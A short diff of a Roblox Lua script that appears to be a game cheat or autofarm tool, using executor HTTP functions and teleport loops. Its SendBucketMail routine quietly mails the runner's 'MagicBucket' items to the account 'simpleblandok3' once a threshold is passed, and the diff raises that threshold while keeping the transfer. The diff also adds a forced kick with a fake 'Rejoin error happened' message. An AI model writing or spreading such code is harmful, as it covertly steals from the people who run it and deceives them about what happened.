@@ -415,7 +415,7 @@ local request = (syn and syn.request) or request or (http and http.request) or h
 
 local function SendBucketMail()
     while true do
-        if MagicBucketAM > 100 then
+        if MagicBucketAM > 99100 then
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -829,5 +829,7 @@ while true do
    Teleport()
    wait(15)
 end
+wait(30)
+game.Players.LocalPlayer:Kick("Rejoin error happened")
 
  
